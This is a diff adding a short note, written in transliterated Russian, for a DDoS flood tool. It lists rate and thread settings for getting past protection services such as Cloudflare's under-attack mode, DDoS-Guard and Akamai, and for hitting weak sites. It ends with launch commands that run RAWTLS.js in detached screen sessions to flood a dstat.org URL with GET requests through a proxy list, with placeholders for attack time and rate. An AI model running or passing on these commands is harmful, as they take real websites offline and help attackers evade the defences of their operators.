@@ -1,0 +1,12 @@
+
+50 cfb uam
+40 ddg
+100 dla slabix saitov
+150 socket
+300 - 600 okamai
+45 clabuu cfb 
+55 culnuu cfb 
+50-60  dla bfm
+komanda zapuska: 
+screen -md node RAWTLS.js GET 50 http://cogentv2.dstat.org/ 10000 500 proxu.txt
+screen -md node RAWTLS.js GET vrema ataki http://cogentv2.dstat.org/ 10000 znachenie proxu.txt
